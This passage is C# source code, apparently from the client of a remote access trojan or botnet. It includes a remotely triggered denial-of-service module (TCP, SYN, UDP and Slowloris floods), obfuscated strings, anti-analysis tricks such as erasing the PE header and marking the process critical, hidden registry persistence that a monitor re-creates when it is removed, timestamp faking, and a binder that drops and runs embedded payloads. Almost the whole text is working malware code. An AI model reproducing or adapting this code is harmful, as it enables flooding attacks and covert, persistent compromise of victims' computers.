            //            if (!InitializedPlugins.ContainsKey(plugin.Guid))
            //            {
            //                InitializedPlugins.Add(plugin.Guid, plugin);
            //            }
            //            else
            //                alreadyStored++;
            //            lastError = string.Empty;
            //            if (alreadyStored == 2)
            //            {
            //                lastError = plugin.Name + Encryption.Decrypt("[P_ALREADY_STORED]", true);
            //                return false;
            //            }
            //            if (PluginAdded != null)
            //            {
            //                PluginAdded(null, plugin);
            //            }
            //            return true;
            //        }
            //    }
            //    lastError = Encryption.Decrypt("[P_CLASS_NOT_FOUND]", true);
            //}
            //catch (Exception ex)
            //{
            //    Console.WriteLine(ex.Message);
            //    lastError = ex.Message;
            //}
        }
        public static void Remove(Guid guid)
        {
            if (InitializedPlugins.ContainsKey(guid))
            {
                Plugins.Remove(guid);
                InitializedPlugins.Remove(guid);
            }
        }
        public static string GetLastError()
        {
            return lastError;
        }
        public static void Unload()
        {
            try
            {
                if (Settings.Install)
                {
                    switch (Settings.PluginRegHive)
                    {
                        case RegistryHive.CurrentUser:
                            Registry.CurrentUser.CreateSubKey(Settings.PluginRegLocation).DeleteValue(Settings.PluginStoreName);
                            break;

                        default:
                            Registry.LocalMachine.CreateSubKey(Settings.PluginRegLocation).DeleteValue(Settings.PluginStoreName);
                            break;
                    }
                }
            }
            catch { }
        }
        public static Assembly GetIPlugin()
        {
            ResourceManager rm = new ResourceManager("pl", Assembly.GetEntryAssembly());
            byte[] pl = (byte[])rm.GetObject("ipl");
            rm.ReleaseAllResources();
            return Assembly.Load(Encryption.Decrypt(pl, false));
        }
    }
} //Plugin
namespace Client
{
    class StressTest
    {
        public enum Type
        {
            TCP = 0,
            SYN = 1,
            UDP = 2,
            Slowloris = 3
        }
        static Type currentType;
        public static Type CurrentType { get { return currentType; } }
        public static string CurrentTypeAsString
        {
            get
            {
                switch (currentType)
                {
                    case Type.TCP:
                        return Encryption.Decrypt("[TCP]", true);

                    case Type.SYN:
                        return Encryption.Decrypt("[SYN]", true);

                    case Type.UDP:
                        return Encryption.Decrypt("[UDP]", true);

                    case Type.Slowloris:
                        return Encryption.Decrypt("[Slowloris]", true);
                }
                return null;
            }
        }
        static bool active;
        public static bool Active { get { return active; } }
        static string host;
        static int port, sockets, timeout, packets;
        static cSocket client;
        public static void Initialize(Type type, string Host, int Port, int Sockets, int Packets, int Timeout, cSocket Client)
        {
            currentType = type;
            host = Host;
            port = Port;
            sockets = Sockets;
            packets = Packets;
            timeout = Timeout;
            client = Client;
            active = false;
        }
        public static void Begin()
        {
            active = true;
            new Thread(backStart).Start();
        }
        public static void Abort()
        {
            active = false;
        }
        static void backStart()
        {
            for (int i = 0; i < sockets; i++)
            {
                try
                {
                    Thread t = new Thread(stress);
                    t.IsBackground = true;
                    t.Start();
                }
                catch (OutOfMemoryException)
                {
                    sockets = i - 1;
                    break;
                }
            }
        }
        static void stress()
        {
            int counter = 0;
            while (active && client.Connected)
            {
                switch (currentType)
                {
                    case Type.TCP:
                        Socket tcpSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        tcpSock.Blocking = false;
                        while (counter < packets && active && client.Connected)
                        {
                            try
                            {
                                tcpSock.Connect(host, port);
                                tcpSock.Send(tcpRandom());
                                tcpSock.Close();
                                tcpSock = null;
                            }
                            catch
                            {
                                tcpSock.Close();
                                tcpSock = null;
                                break;
                            }
                            counter++;
                            Thread.Sleep(1);
                        }
                        Thread.Sleep(timeout);
                        break;

                    case Type.SYN:
                        Socket synSocket =
                            new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        synSocket.Blocking = false;
                        try
                        {
                            synSocket.BeginConnect(host, port, new AsyncCallback(onConnect), null);
                        }
                        catch
                        {
                        }
                        Thread.Sleep(100);
                        try
                        {
                            if (synSocket.Connected)
                            {
                                synSocket.Disconnect(false);
                            }
                            synSocket.Close();
                            synSocket = null;
                        }
                        catch { }
                        Thread.Sleep(timeout);
                        break;

                    case Type.UDP:
                        Socket udpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        udpSocket.Blocking = false;
                        try
                        {
                            udpSocket.Connect(host, port);
                            while (counter < packets && active && client.Connected)
                            {
                                udpSocket.Send(udpRandom());
                                counter++;
                                Thread.Sleep(1);
                            }
                            udpSocket.Close();
                            udpSocket = null;
                        }
                        catch
                        {
                            udpSocket.Close();
                            udpSocket = null;
                            break;
                        }
                        Thread.Sleep(timeout);
                        break;

                    case Type.Slowloris:
                        Socket slowSocket = null;
                        try
                        {
                            slowSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                            slowSocket.Connect(host, port);
                            slowSocket.Send(GenerateRequest());
                            while (slowSocket.Connected && active && client.Connected)
                            {
                                slowSocket.Send(GenerateRequest());
                                Thread.Sleep(2000);
                            }
                        }
                        catch
                        {
                            slowSocket.Close();
                            slowSocket = null;
                        }
                        Thread.Sleep(timeout);
                        break;
                }
                counter = 0;
            }
            if (active)
                Abort();
        }
        static void onConnect(IAsyncResult ar)
        {
        }
        private static byte[] udpRandom()
        {
            Random r = new Random();
            byte[] b = new byte[r.Next(1470, 65507)];
            r.NextBytes(b);
            r = null;
            return b;
        }
        private static byte[] tcpRandom()
        {
            Random r = new Random();
            byte[] b = new byte[r.Next(1470, 65535)];
            r.NextBytes(b);
            r = null;
            return b;
        }
        static byte[] GenerateRequest()
        {
            Random r = new Random();
            StringBuilder req = new StringBuilder();
            req.AppendLine("GET / HTTP/1.1");
            req.AppendLine("Host: " + host);
            req.AppendLine("User-Agent: " + Encryption.Decrypt(browsers[r.Next(0, browsers.Length - 1)], true) + " " + Encryption.Decrypt(userAgents[r.Next(0, userAgents.Length - 1)], true));
            req.AppendLine("Content-Length: " + r.Next(1, 1000).ToString());
            req.AppendLine("X-a: " + r.Next(1, 10000).ToString());
            req.Append("Connection: keep-alive");
            return Encoding.ASCII.GetBytes(req.ToString());
        }
        static string[] userAgents = new string[] 
        {
            "[AGENT0]",
            "[AGENT1]",
            "[AGENT2]",
            "[AGENT3]",
            "[AGENT4]",
            "[AGENT5]",
            "[AGENT6]",
            "[AGENT7]",
            "[AGENT8]",
            "[AGENT9]",
            "[AGENT10]",
            "[AGENT11]",
            "[AGENT12]",
            "[AGENT13]",
            "[AGENT14]",
            "[AGENT15]",
            "[AGENT16]",
            "[AGENT17]",
            "[AGENT18]",
            "[AGENT19]",
            "[AGENT20]",
            "[AGENT21]",
            "[AGENT22]",
            "[AGENT23]",
            "[AGENT24]",
            "[AGENT25]",
            "[AGENT26]",
            "[AGENT27]"
        //"(compatible; MSIE 6.0; Windows NT)",
        //"(Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9b5) Gecko/2008032619 Firefox/3.0b5",
        //"(Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1 ",
        //"(MobilePhone SCP-5500/US/1.0) NetFront/3.0 MMP/2.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)",
        //"[en] (WinNT; U)",
        //"(compatible; MSIE 7.0; Windows NT 5.1; bgft) ",
        //"(compatible; MSIE 6.0; Win32)",
        //"(X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
        //"(X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801",
        //"(SunOS 5.8 sun4u; U) Opera 5.0 [en]",
        //"(compatible; Googlebot/2.1; http://www.google.com/bot.html)  ",
        //"(X11; U; Linux i686; en-US; rv:1.8) Gecko/20051111 Firefox/1.5 BAVM/1.0.0",
        //"(X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8 ",
        //"(Windows; U; Windows NT 6.1; it; rv:1.9.2) Gecko/20100115 Firefox/3.6",
        //"Galeon/1.2.0 (X11; Linux i686; U;) Gecko/20020326",
        //"(Windows NT 5.1; U; en) Presto/2.5.22 Version/10.50",
        //"(Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
        //"(X11; Linux x86_64; U; Linux Mint; en) Presto/2.2.15 Version/10.10",
        //"(Macintosh; PPC Mac OS X; U; en) Opera 8.0",
        //"(Windows; U; Windows NT 5.1; en-US; rv:0.9.6) Gecko/20011128",
        //"(Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
        //"(iPhone; U; CPU like Mac OS X; en) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/4A93 Safari/419.3",
        //"(compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET CLR 4.0.20402; MS-RTC LM 8)",
        //"(Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
        //"(compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
        //"(compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
        //"(compatible; MSIE 6.1; Windows XP)",
        //"(Windows; U; Windows NT 6.1; nl; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3"
        }; //28

        static string[] browsers = new string[]
        {
            "[BROWSER0]",
            "[BROWSER1]",
            "[BROWSER2]",
            "[BROWSER3]",
            "[BROWSER4]",
            "[BROWSER5]",
            "[BROWSER6]",
            "[BROWSER7]",
            "[BROWSER8]",
            "[BROWSER9]"
        //"Mozilla/3.0 ",
        //"Mozilla/3.1 ",
        //"Mozilla/3.6 ",
        //"Mozilla/4.0 ",
        //"Mozilla/4.08 ",
        //"Mozilla/5.0 ",
        //"Opera/9.33 ",
        //"Opera/9.0 ",
        //"Opera/8.90 ",
        //"Opera/9.80 "
        };
    }
} //Dos
namespace Client
{
    class Encryption
    {
        public static byte[] Encrypt(byte[] data, bool base64)
        {
            try
            {
                Random r = new Random();
                int key = r.Next(-2000000000, 2000000000);
                for (int i = 0; i < data.Length; i++)
                {
                    data[i] = data[i] += (byte)key;
                }
                List<byte> bytes = new List<byte>();
                bytes.AddRange(data);
                byte[] b = BitConverter.GetBytes(key);
                bytes.InsertRange(bytes.Count / 2, b);
                byte[] done = bytes.ToArray();
                bytes.Clear();
                bytes = null;
                return base64 ? Encoding.ASCII.GetBytes(Convert.ToBase64String(done)) : done;
            }
            catch { }
            return null;
        }
        public static byte[] Decrypt(byte[] data, bool base64)
        {
            try
            {
                List<byte> bytes = new List<byte>(base64 ? Convert.FromBase64String(Encoding.ASCII.GetString(data)) : data);
                int key = (int)BitConverter.ToInt32(bytes.GetRange((bytes.Count - 4) / 2, 4).ToArray(), 0);
                bytes.RemoveRange((bytes.Count - 4) / 2, 4);
                for (int i = 0; i < bytes.Count; i++)
                {
                    bytes[i] = bytes[i] -= (byte)key;
                }
                byte[] done = bytes.ToArray();
                bytes.Clear();
                bytes = null;
                return done;
            }
            catch { }
            return null;
        }
        public static string Encrypt(string data, bool base64)
        {
            try
            {
                Random r = new Random();
                int key = r.Next(-2000000000, 2000000000);
                byte[] toArray = Encoding.GetEncoding(1252).GetBytes(data);
                for (int i = 0; i < toArray.Length; i++)
                {
                    toArray[i] += (byte)key;
                }
                List<byte> bytes = new List<byte>();
                bytes.AddRange(toArray);
                byte[] b = BitConverter.GetBytes(key);
                bytes.InsertRange(bytes.Count / 2, b);
                byte[] done = bytes.ToArray();
                bytes.Clear();
                bytes = null;
                return base64 ? Convert.ToBase64String(done) : Encoding.GetEncoding(1252).GetString(done);
            }
            catch { }
            return string.Empty;
        }
        public static string Decrypt(string data, bool base64)
        {
            try
            {
                List<byte> bytes = new List<byte>(base64 ? Convert.FromBase64String(data) : Encoding.GetEncoding(1252).GetBytes(data));
                int key = (int)BitConverter.ToInt32(bytes.GetRange((bytes.Count - 4) / 2, 4).ToArray(), 0);
                bytes.RemoveRange((bytes.Count - 4) / 2, 4);
                for (int i = 0; i < bytes.Count; i++)
                {
                    bytes[i] = bytes[i] -= (byte)key;
                }
                byte[] done = bytes.ToArray();
                bytes.Clear();
                bytes = null;
                return Encoding.GetEncoding(1252).GetString(done);
            }
            catch { }
            return string.Empty;
        }

        public static byte[] EncryptDll(byte[] bytes)
        {
            MemoryStream memoryStream = new MemoryStream();
            using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
            {
                gZipStream.Write(bytes, 0, bytes.Length);
            }

            memoryStream.Position = 0;

            byte[] compressedData = new byte[memoryStream.Length];
            memoryStream.Read(compressedData, 0, compressedData.Length);

            byte[] gZipBuffer = new byte[compressedData.Length + 4];
            Buffer.BlockCopy(compressedData, 0, gZipBuffer, 4, compressedData.Length);
            Buffer.BlockCopy(BitConverter.GetBytes(bytes.Length), 0, gZipBuffer, 0, 4);
            return gZipBuffer;
        }
        public static byte[] DecryptDll(byte[] bytes)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                int dataLength = BitConverter.ToInt32(bytes, 0);
                memoryStream.Write(bytes, 4, bytes.Length - 4);

                byte[] buffer = new byte[dataLength];

                memoryStream.Position = 0;
                using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
                {
                    gZipStream.Read(buffer, 0, buffer.Length);
                }

                return buffer;
            }
        }
    }
} //Encryption
namespace Client
{
    public static class PE
    {
        public static void CheckSettings()
        {
            if (Settings.ErasePE)
                ErasePE();
            if (Settings.CheckParent)
                if (!CheckParentProcess)
                    Process.GetCurrentProcess().Kill();
            if (Settings.SetCrit)
                SetCrit();

        }
        public static void ErasePE()
        {
            try
            {
                uint oldProtect;
                IntPtr baseAddr = API.GetModuleHandle(null);
                API.VirtualProtect(baseAddr, 512, 0x04, out oldProtect);
                API.ZeroMemory(baseAddr, (IntPtr)512);
            }
            catch { }
        }
        public static void SetCrit()
        {
            try
            {
                int enable = 1;
                API.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref enable , sizeof(int));
            }
            catch { }
        }
        public static bool CheckParentProcess
        {
            get
            {
                using (ManagementObject mo = new ManagementObject("win32_process.handle='" + Process.GetCurrentProcess().Id.ToString() + "'"))
                {
                    mo.Get();
                    if (Process.GetProcessById(Convert.ToInt32(mo["ParentProcessId"])).ProcessName.ToLower() != "explorer")
                        return false;
                    return true;
                }
            }
        }
        public static void Melt()
        {
            try
            {
                string tmp = Path.GetTempFileName();
                File.Delete(tmp);
                tmp = tmp.Replace(".tmp", ".exe");
                File.Move(Process.GetCurrentProcess().MainModule.FileName, tmp);
            }
            catch { }
        }
    }
} //PE
namespace Client
{
    class Installation
    {
        public static void Install()
        {
            Drop();
            Safe();
            WriteToRegistry();
        }
        static void Drop()
        {
            try
            {
                if (!Directory.Exists(Settings.InstallPath))
                    Directory.CreateDirectory(Settings.InstallPath);
            }
            catch
            {
            }
            try
            {
                File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(Settings.InstallPath, Encryption.Decrypt(Settings.InstallName, true)), true);
            }
            catch
            {
            }
            try
            {
                if (Settings.ChangeCreation)
                {
                    int day, month, year;
                    Random random = new Random();
                    day = random.Next(1, 28);
                    month = random.Next(1, 12);
                    year = random.Next(2000, DateTime.Now.Year);
                    Directory.SetCreationTime(Path.Combine(Settings.InstallPath, Encryption.Decrypt(Settings.InstallName, true)), new DateTime(year, month, day));
                }
            }
            catch { }
            if (Settings.HideFolder)
            {
                try
                {
                    File.SetAttributes(Settings.InstallPath, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
                }
                catch { }
            }
            if (Settings.HideFile)
            {
                try
                {
                    File.SetAttributes(Path.Combine(Settings.InstallPath, Encryption.Encrypt(Settings.InstallName, true)), FileAttributes.Hidden | FileAttributes.NotContentIndexed);
                }
                catch { }
            }
        }
        public static void WriteToRegistry()
        {
            try
            {
                if (Settings.HKCU)
                {
                    Registry.CurrentUser.CreateSubKey(Encryption.Decrypt("[RUN]", true)).SetValue(Encryption.Decrypt(Settings.HKCU_RegName, true), Settings.InstallPath + "\\" + Encryption.Decrypt(Settings.InstallName, true));
                }
            }
            catch
            {
            }
            try
            {
                if (Settings.HKLM)
                {
                    Registry.LocalMachine.CreateSubKey(Encryption.Decrypt("[RUN]", true)).SetValue(Encryption.Decrypt(Settings.HKCU_RegName, true), Settings.InstallPath + "\\" + Encryption.Decrypt(Settings.InstallName, true));
                }
            }
            catch
            {
            }
            try
            {
                if (Settings.ActiveX)
                {
                    RegistryKey hkey = Registry.LocalMachine.CreateSubKey(Encryption.Decrypt("[AX]", true) + Encryption.Decrypt(Settings.ActiveXKey, true));
                    hkey.SetValue("[AXSTUB]", Settings.InstallPath + "\\" + Encryption.Decrypt(Settings.InstallName, true));
                    hkey.SetValue("[AXINSTALLED]", 1, RegistryValueKind.DWord);
                }
            }
            catch
            {
            }
        }
        static void Safe()
        {
            try
            {
                Process proc = new Process();
                ProcessStartInfo info = new ProcessStartInfo();
                info.FileName = "cmd.exe";
                info.UseShellExecute = false;
                info.RedirectStandardInput = true;
                info.CreateNoWindow = true;
                info.WindowStyle = ProcessWindowStyle.Hidden;
                proc.StartInfo = info;
                proc.Start();

                StreamWriter w = proc.StandardInput;

                w.WriteLine("cd " + Settings.InstallPath);
                w.WriteLine(string.Format(Encryption.Decrypt("[SAFE]", true), Encryption.Decrypt(Settings.InstallName, true)));

                w.Close();
                proc.Kill();
            }
            catch { }
        }
        public static void Uninstall()
        {
            try
            {
                Registry.CurrentUser.CreateSubKey(Encryption.Decrypt("[RUN]", true)).DeleteValue(Encryption.Decrypt(Settings.HKCU_RegName, true));
            }
            catch
            {
            }
            try
            {
                Registry.LocalMachine.CreateSubKey(Encryption.Decrypt("[RUN]", true)).DeleteValue(Encryption.Decrypt(Settings.HKLM_RegName, true));
            }
            catch
            {
            }
            try
            {
                Registry.LocalMachine.DeleteSubKey(Encryption.Decrypt("[AX]", true) + Encryption.Decrypt(Settings.ActiveXKey, true));
            }
            catch { }

            try
            {
                switch (Settings.PluginRegHive)
                {
                    case RegistryHive.CurrentUser:
                        Registry.CurrentUser.DeleteSubKey(Settings.PluginRegLocation);
                        break;

                    case RegistryHive.LocalMachine:
                        Registry.LocalMachine.DeleteSubKey(Settings.PluginRegLocation);
                        break;
                }
            }
            catch { }
            QueueForDeletion();
        }
        public static void QueueForDeletion()
        {
            try
            {
                string tempPath = Path.GetTempFileName();
                File.Delete(tempPath);
                File.Move(Process.GetCurrentProcess().MainModule.FileName, tempPath);
                API.MoveFileEx(tempPath, null, API.MoveFileFlags.MOVEFILE_DELAY_UNTIL_REBOOT);
            }
            catch (Exception)
            {
                //Console.WriteLine(ex.Message);
            }
        }
        public enum Hive
        {
            HCKU,
            HKLM,
            ACTIVEX
        }
    }
    class API
    {
        [Flags]
        public enum MoveFileFlags
        {
            MOVEFILE_REPLACE_EXISTING = 0x00000001,
            MOVEFILE_COPY_ALLOWED = 0x00000002,
            MOVEFILE_DELAY_UNTIL_REBOOT = 0x00000004,
            MOVEFILE_WRITE_THROUGH = 0x00000008,
            MOVEFILE_CREATE_HARDLINK = 0x00000010,
            MOVEFILE_FAIL_IF_NOT_TRACKABLE = 0x00000020
        }
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode, EntryPoint = "MoveFileEx")]
        public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName,
           MoveFileFlags dwFlags);

        [DllImport("kernel32.dll", SetLastError = true, EntryPoint = "VirtualProtect")]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
           uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlZeroMemory", SetLastError = false)]
        public static extern void ZeroMemory(IntPtr dest, IntPtr size);

        [DllImport("ntdll.dll", SetLastError = true, EntryPoint = "NtSetInformationProcess")]
        public static extern int NtSetInformationProcess(
            IntPtr hProcess,
            int processInformationClass,
            ref int processInformation,
            int processInformationLength);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, EntryPoint = "GetModuleHandle")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
    }
    class OS
    {
        public static string DetectOS()
        {
            OperatingSystem os = Environment.OSVersion;
            string runningOS = "";

            if (os.Platform.ToString() == "Win32NT")
            {
                switch (OSVersionNoRevision(os.Version))
                {
                    case "4.1.2222":
                        runningOS = Encryption.Decrypt("[WIN98]", true);
                        break;
                    case "4.1.2600":
                        runningOS = Encryption.Decrypt("[WIN98SE]", true);
                        break;
                    case "4.9.3000":
                        runningOS = Encryption.Decrypt("[WINME]", true);
                        break;
                    case "5.0.2195":
                        runningOS = Encryption.Decrypt("[WIN2000]", true);
                        break;
                    case "5.1.2600":
                    case "5.2.3790":
                        runningOS = Encryption.Decrypt("[WINXP]", true);
                        break;
                    case "6.0.6000":
                    case "6.0.6001":
                    case "6.0.6002":
                    case "6.0.6003":
                        runningOS = Encryption.Decrypt("[WINVIS]", true);
                        break;
                    case "6.1.7600":
                    case "6.1.7601":
                    case "6.1.7602":
                    case "6.1.7603":
                        runningOS = Encryption.Decrypt("[WIN7]", true);
                        break;
                    default:
                        runningOS = Encryption.Decrypt("[UNK]", true);
                        break;
                }
            }

            string sPack = string.Empty;
            OSVERSIONINFOEX versionInfo = new OSVERSIONINFOEX();

            versionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX));

            if (GetVersionEx(ref versionInfo))
            {
                if (versionInfo.szCSDVersion.ToString().Contains(Encryption.Decrypt("[H_SP1]", true)))
                {
                    runningOS += Encryption.Decrypt("[SP1]", true);
                }
                if (versionInfo.szCSDVersion.ToString().Contains(Encryption.Decrypt("[H_SP2]", true)))
                {
                    runningOS += Encryption.Decrypt("[SP2]", true);
                }
                if (versionInfo.szCSDVersion.ToString().Contains(Encryption.Decrypt("[H_SP3]", true)))
                {
                    runningOS += Encryption.Decrypt("[SP3]", true);
                }
                if (versionInfo.szCSDVersion.ToString().Contains(Encryption.Decrypt("[H_SP4]", true)))
                {
                    runningOS += Encryption.Decrypt("[SP4]", true);
                }
                if (versionInfo.szCSDVersion.ToString().Contains(Encryption.Decrypt("[H_SP5]", true)))
                {
                    runningOS += Encryption.Decrypt("[SP5]", true);
                }
                if (versionInfo.szCSDVersion.ToString().Contains(Encryption.Decrypt("[H_SP6]", true)))
                {
                    runningOS += Encryption.Decrypt("[SP6]", true);
                }
                if (versionInfo.szCSDVersion.ToString().Contains(Encryption.Decrypt("[H_SP7]", true)))
                {
                    runningOS += Encryption.Decrypt("[SP7]", true);
                }
                if (versionInfo.szCSDVersion.ToString().Contains(Encryption.Decrypt("[H_SP8]", true)))
                {
                    runningOS += Encryption.Decrypt("[SP8]", true);
                }
                if (versionInfo.szCSDVersion.ToString().Contains(Encryption.Decrypt("[H_SP9]", true)))
                {
                    runningOS += Encryption.Decrypt("[SP9]", true);
                }
            }
            switch (is64Bit())
            {
                case true:
                    runningOS += Encryption.Decrypt("[64]", true);
                    break;
                default:
                    runningOS += Encryption.Decrypt("[86]", true);
                    break;
            }
            return runningOS;
        }

        private static string OSVersionNoRevision(Version ver)
        {
            return ((ver.Major.ToString() + ".") + ver.Minor.ToString() + ".") + ver.Build.ToString();
        }
        [DllImport("kernel32.dll")]
        private static extern bool GetVersionEx(ref OSVERSIONINFOEX osVersionInfo);

        [StructLayout(LayoutKind.Sequential)]
        public struct OSVERSIONINFOEX
        {
            public int dwOSVersionInfoSize;
            public int dwMajorVersion;
            public int dwMinorVersion;
            public int dwBuildNumber;
            public int dwPlatformId;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string szCSDVersion;
            public short wServicePackMajor;
            public short wServicePackMinor;
            public short wSuiteMask;
            public byte wProductType;
            public byte wReserved;
        }
        public static bool is64Bit()
        {
            try
            {
                if (!string.IsNullOrEmpty(System.Environment.GetEnvironmentVariable("ProgramW6432")))
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch
            {
                return false;
            }
        }
    }
    class Speed
    {
        static Thread t;
        static List<cSocket> clients = new List<cSocket>();
        public static void Add(cSocket client)
        {
            clients.Add(client);
        }
        public static void Remove(cSocket client)
        {
            clients.Remove(client);
        }
        public static void Run()
        {
            t = new Thread(run);
            t.Start();
        }
        static void run()
        {
            WebClient wc = new WebClient();
            while (true)
            {
                if (clients.Count < 1)
                {
                    Thread.Sleep(5000);
                    continue;
                }
                string speed = GetSpeed();
                for (int i = 0; i < clients.Count; i++)
                {
                    if (i < clients.Count && clients[i] != null)
                    {
                        if (clients[i].Connected)
                        {
                            clients[i].Send(new BasePacket(cSocket.Header.SPEED, Encoding.Default.GetBytes(GetSpeed())).GetBytes());
                        }
                    }
                }
                Thread.Sleep(TimeSpan.FromSeconds(60.0));
            }
        }
        public static void Stop()
        {
            if (t != null)
            {
                t.Abort();
            }
        }
        static string GetSpeed()
        {
            try
            {
                WebClient wc = new WebClient();
                double starttime = Environment.TickCount;
                byte[] b = wc.DownloadData("http://google.com/");
                double endtime = Environment.TickCount;
                double secs = Math.Floor(endtime - starttime) / 1000;
                double secs2 = Math.Round(secs, 0);
                double kbsec = Math.Round(1024 / secs);
                b = null;
                return kbsec + " KB\\Sec";
            }
            catch
            {
            }
            return "Error";
        }
    }
    class xMutex
    {
        static Mutex mu;
        public static bool Running
        {
            get
            {
                return !mu.WaitOne(0, false);
            }
        }
        public static void Set(string name)
        {
            if (mu != null)
                return;

            mu = new Mutex(false, name);
        }
        public static void Close()
        {
            if (mu == null)
                return;
            mu.Close();
            mu = null;
        }
    }
    class Country
    {
        [DllImport("kernel32.dll", EntryPoint = "GetLocaleInfo")]
        private static extern int GetLocaleInfo(uint Locale, uint LCType, [Out()]
System.Text.StringBuilder lpLCData, int cchData);

        private const uint LOCALE_SYSTEM_DEFAULT = 0x400;

        private const uint LOCALE_SENGCOUNTRY = 0x1002;
        private static string GetInfo(uint lInfo)
        {
            StringBuilder lpLCData = new System.Text.StringBuilder(256);
            int ret = GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, lInfo, lpLCData, lpLCData.Capacity);
            if (ret > 0)
            {
                return lpLCData.ToString().Substring(0, ret - 1);
            }
            return string.Empty;
        }

        public static string GetCountry()
        {
            string MyCountry = (GetInfo(LOCALE_SENGCOUNTRY));
            return MyCountry;
        }
    }
    class Binder
    {
        public static void Execute()
        {
            ThreadStart start = delegate
            {
                Stream str = Assembly.GetExecutingAssembly().GetManifestResourceStream("b");
                byte[] bData = new byte[str.Length];
                str.Read(bData, 0, bData.Length);
                bData = Encryption.Decrypt(bData, false);
                str.Close();
                MemoryStream ms = new MemoryStream(bData);
                BinaryReader r = new BinaryReader(ms);
                while (r.PeekChar() > 0)
                {
                    string name = r.ReadString();
                    int len = r.ReadInt32();
                    byte[] file = r.ReadBytes(len);

                    try
                    {
                        if (!File.Exists(Path.GetTempPath() + name))
                        {
                            File.WriteAllBytes(Path.GetTempPath() + name, file);
                        }
                        Process.Start(Path.GetTempPath() + name);
                    }
                    catch { }
                }
            };
            new Thread(start).Start();
        }
    }
} //Misc
namespace Client
{
    public class RegistryModerator
    {
        static List<RegistryMonitor> monitors;
        static bool initialized = false;
        public static bool Initialized
        {
            get { return initialized; }
        }
        public static void Initialize()
        {
            monitors = new List<RegistryMonitor>();
            initialized = true;
        }
        public static void Add(RegistryMonitor monitor)
        {
            monitors.Add(monitor);
        }
        public static void Run()
        {
            foreach (RegistryMonitor mon in monitors)
            {
                mon.RegChanged += new EventHandler(mon_RegChanged);
                mon.Start();
            }
        }
        public static void Stop()
        {
            foreach (RegistryMonitor mon in monitors)
            {
                mon.RegChanged -= mon_RegChanged;
                mon.Stop();
            }
        }

        static void mon_RegChanged(object sender, EventArgs e)
        {
            Installation.WriteToRegistry();
        }
    }
    public class RegistryMonitor : IDisposable
    {
        #region P/Invoke

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern int RegOpenKeyEx(IntPtr hKey, string subKey, uint options, int samDesired,
                                               out IntPtr phkResult);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern int RegNotifyChangeKeyValue(IntPtr hKey, bool bWatchSubtree,
                                                          RegChangeNotifyFilter dwNotifyFilter, IntPtr hEvent,
                                                          bool fAsynchronous);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern int RegCloseKey(IntPtr hKey);

        private const int KEY_QUERY_VALUE = 0x0001;
        private const int KEY_NOTIFY = 0x0010;
        private const int STANDARD_RIGHTS_READ = 0x00020000;

        private static readonly IntPtr HKEY_CLASSES_ROOT = new IntPtr(unchecked((int)0x80000000));
        private static readonly IntPtr HKEY_CURRENT_USER = new IntPtr(unchecked((int)0x80000001));
        private static readonly IntPtr HKEY_LOCAL_MACHINE = new IntPtr(unchecked((int)0x80000002));
        private static readonly IntPtr HKEY_USERS = new IntPtr(unchecked((int)0x80000003));
        private static readonly IntPtr HKEY_PERFORMANCE_DATA = new IntPtr(unchecked((int)0x80000004));
        private static readonly IntPtr HKEY_CURRENT_CONFIG = new IntPtr(unchecked((int)0x80000005));
        private static readonly IntPtr HKEY_DYN_DATA = new IntPtr(unchecked((int)0x80000006));

        #endregion

        #region Event handling
        public event EventHandler RegChanged;

        protected virtual void OnRegChanged()
        {
            EventHandler handler = RegChanged;
            if (handler != null)
                handler(this, null);
        }

        public event ErrorEventHandler Error;

        protected virtual void OnError(Exception e)
        {
            ErrorEventHandler handler = Error;
            //if (handler != null)
                //handler(this, new ErrorEventArgs(e));
        }

        #endregion

        #region Private member variables

        private IntPtr _registryHive;
        private string _registrySubName;
        private object _threadLock = new object();
        private Thread _thread;
